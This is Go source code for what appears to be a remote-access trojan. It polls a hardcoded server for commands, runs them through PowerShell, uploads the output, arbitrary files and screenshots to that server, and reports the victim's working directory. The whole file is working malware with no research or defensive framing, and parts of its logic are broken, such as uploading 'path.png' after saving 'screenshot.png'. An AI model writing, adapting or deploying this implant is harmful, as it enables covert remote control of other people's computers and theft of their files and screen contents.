package main

import (
    "encoding/base64"
	"encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
	"bytes"
	"os/exec"
	"runtime"
	"strings"
    "time"
)


func GetCommand() string {
    client := http.Client{}
    loc, err := os.Getwd()
    if err != nil {
        panic(err)
    }
    locBase64 := base64.StdEncoding.EncodeToString([]byte(loc))
    
    defer client.CloseIdleConnections()
    resp, err := client.Get("http://192.168.1.5:8000/" + "command?q=" + locBase64)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        panic(err)
    }
    return string(body)
}


func PostRes(res string) {
	client := http.Client{}
	
	reqBody, err := json.Marshal(map[string]string{
		"data": res,
	})
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("POST", "http://192.168.1.5:8000/"+"res", bytes.NewBuffer(reqBody))
	if err != nil {
		panic(err)
	}


	req.Header.Set("Content-Type", "application/json")


	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

}


func takeScreenshot() {
	
	filePath := "screenshot.png"

	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("Powershell", "-Command", "$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.X, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Y, 0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size); $bmp.Save('"+filePath+"', 'Png'); $graphics.Dispose(); $bmp.Dispose();")
	} else {
		fmt.Println("Unsupported OS")
		return
	}

	err := cmd.Run()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Screenshot saved to", filePath)
}



func postFile(name string) {
	filePath := name
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	fileData, err := ioutil.ReadAll(file)
	if err != nil {
		panic(err)
	}

	
	client := http.Client{}

	
	reqBody := bytes.NewReader(fileData)

	
	req, err := http.NewRequest("POST", "http://192.168.1.5:8000/"+"file/"+name, reqBody)
	if err != nil {
		panic(err)
	}

	
	req.Header.Set("Content-Type", "application/json")

	
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

}



func ExecuteCommand(command string) string {
	
	cmd := exec.Command("Powershell", command)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {

		fmt.Println("Error executing command:", err)
		return ""
	}

	return stdout.String()
}


func main() {
    for {
		
        command := GetCommand()
        if len(command) == 0 {
            time.Sleep(3 * time.Second)
            continue
        } else {
            if command == "screenshot" {
                takeScreenshot()
                postFile("path.png")
            } else if strings.Contains(command, "cd") {
                parts := strings.Split(command, " ")
                os.Chdir(parts[1])
            } else if strings.Contains(command, "sendfile") {
                parts := strings.Split(command, " ")
                postFile(parts[1])
            } else if command == "exit" {
                return
            } else {
                commandResult := ExecuteCommand(command)
                PostRes(commandResult)
            }
        }
    }
}
